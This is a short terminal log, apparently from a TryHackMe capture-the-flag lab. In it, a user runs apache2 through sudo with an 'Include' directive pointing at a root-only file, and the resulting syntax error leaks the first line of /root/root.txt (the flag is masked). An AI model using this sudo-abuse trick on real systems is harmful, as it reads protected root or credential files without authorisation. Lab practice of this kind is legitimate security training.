dolivaw@ubuntu-jammy:~$ sudo -u root /usr/sbin/apache2 -C "Define APACHE_RUN_DIR /tmp" -C "Include $LFILE" -k stop
[Tue Mar 18 18:22:21.107962 2025] [core:warn] [pid 2417] AH00111: Config variable ${APACHE_PID_FILE} is not defined
[Tue Mar 18 18:22:21.108038 2025] [core:warn] [pid 2417] AH00111: Config variable ${APACHE_RUN_USER} is not defined
[Tue Mar 18 18:22:21.108058 2025] [core:warn] [pid 2417] AH00111: Config variable ${APACHE_RUN_GROUP} is not defined
[Tue Mar 18 18:22:21.108092 2025] [core:warn] [pid 2417] AH00111: Config variable ${APACHE_LOG_DIR} is not defined
[Tue Mar 18 18:22:21.111491 2025] [core:warn] [pid 2417:tid 140059161565056] AH00111: Config variable ${APACHE_LOG_DIR} is not defined
[Tue Mar 18 18:22:21.111858 2025] [core:warn] [pid 2417:tid 140059161565056] AH00111: Config variable ${APACHE_LOG_DIR} is not defined
[Tue Mar 18 18:22:21.111885 2025] [core:warn] [pid 2417:tid 140059161565056] AH00111: Config variable ${APACHE_LOG_DIR} is not defined
AH00526: Syntax error on line 1 of /root/root.txt:
Invalid command 'THM{xxxxxxxxxxxxxxxxx}', perhaps misspelled or defined by a module not included in the server configuration

```



